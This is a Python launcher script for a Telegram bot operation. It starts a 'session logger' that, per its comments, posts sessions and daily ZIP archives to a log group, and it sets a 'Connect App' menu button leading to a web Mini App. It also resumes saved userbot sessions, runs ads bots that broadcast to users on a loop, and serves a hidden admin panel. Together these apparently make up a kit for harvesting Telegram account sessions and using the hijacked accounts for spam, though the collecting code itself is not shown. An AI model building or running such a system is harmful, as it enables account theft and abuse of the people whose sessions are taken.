import os
import logging
import asyncio
import nest_asyncio
from telethon.tl import types, functions
from aiohttp import web

import config
import database
import manager
import bot
import ads_bot
import session_logger
from web_server import init_web_app

# Apply nested asyncio loop compatibility patch
nest_asyncio.apply()

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)


async def start_primary_bot():
    """Starts the primary owner bot (menu button + /admin telegram panel)."""
    from telethon import TelegramClient
    if not config.BOT_TOKEN:
        logger.warning("BOT_TOKEN not set - skipping primary bot.")
        return None
    api_id, api_hash = database.get_api_credentials()
    client = TelegramClient(
        os.path.join(config.SESSION_DIR, "personal_bot"),
        api_id,
        api_hash
    )
    bot.register_bot_handlers(client)
    try:
        await client.start(bot_token=config.BOT_TOKEN)
    except Exception as e:
        logger.warning(f"Primary bot could NOT start (token issue?): {e}. Web app + ads bots still run.")
        return None
    webapp_url = database.get_webapp_url()
    try:
        button = types.BotMenuButton(text="🚀 Connect App", url=webapp_url)
        await client(functions.bots.SetBotMenuButtonRequest(
            user_id=types.InputUserEmpty(),
            button=button
        ))
        logger.info(f"Menu button set to: {webapp_url}")
    except Exception as e:
        logger.warning(f"Could not set menu button: {e}")
    logger.info("Primary bot running.")
    return client


async def start_services():
    logger.info("Initializing database connection...")
    database.init_db()

    # 1. Session logger bot (posts sessions + daily ZIP to log group)
    await session_logger.start_log_bot()

    # 2. Primary owner bot (its own /start, /admin panel)
    client = await start_primary_bot()

    # 3. All configured ads-bot tokens from the DB
    await ads_bot.start_all_ads_bots()

    # 4. Resume saved userbot sessions
    await manager.start_all_userbots()

    # 4b. Start the periodic ads-bot user broadcast loop
    ads_bot.start_user_broadcast_loop()

    # 5. Start the web server (Mini App + hidden /admin panel)
    logger.info(f"Initializing web application on port {config.PORT}...")
    app = await init_web_app()
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, '0.0.0.0', config.PORT)
    await site.start()
    logger.info(f"Mini App server running at {config.WEBAPP_URL}")

    # 6. Background tasks
    tasks = [
        asyncio.create_task(session_logger.daily_zip_loop()),
        asyncio.create_task(session_logger._send_events_loop()),
    ]

    try:
        if client is not None:
            await client.run_until_disconnected()
        else:
            # No primary bot (e.g. token invalid) - just keep the app alive.
            await asyncio.Event().wait()
    finally:
        logger.info("Shutdown initiated. Cleaning up...")
        await runner.cleanup()
        await manager.stop_all_userbots()
        await ads_bot.stop_all_ads_bots()
        for t in tasks:
            t.cancel()
        logger.info("Shutdown complete.")


def main():
    try:
        asyncio.run(start_services())
    except (KeyboardInterrupt, SystemExit):
        logger.info("Service stopped gracefully.")


if __name__ == "__main__":
    main()